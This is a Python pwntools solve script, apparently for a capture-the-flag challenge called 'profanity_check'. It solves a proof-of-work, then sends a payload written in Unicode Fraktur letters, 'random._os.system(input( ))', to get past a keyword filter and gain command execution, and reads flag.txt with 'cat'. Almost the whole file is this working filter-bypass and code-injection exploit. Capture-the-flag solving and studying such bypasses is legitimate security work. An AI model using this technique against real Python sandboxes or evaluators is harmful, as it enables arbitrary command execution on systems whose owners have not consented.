#!/usr/bin/env python3

from pwn import *

# https://lingojam.com/FancyTextGenerator
# random._os.system(input( ))
payload = "𝔯𝔞𝔫𝔡𝔬𝔪._𝔬𝔰.𝔰𝔶𝔰𝔱𝔢𝔪(𝔦𝔫𝔭𝔲𝔱( ))"

#conn = process(["python3", "profanity_check.py"])
conn = remote("localhost", 1337)

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

print(conn.recvuntil('== proof-of-work: '))
if conn.recvline().startswith(b'enabled'):
    handle_pow(conn)

conn.recvuntil(">>> ")
conn.sendline(payload)
conn.sendline("cat flag.txt")

flag = conn.recvline()

if b"idek" in flag:
  print(flag)
  exit(0)
exit(1)

conn.interactive()
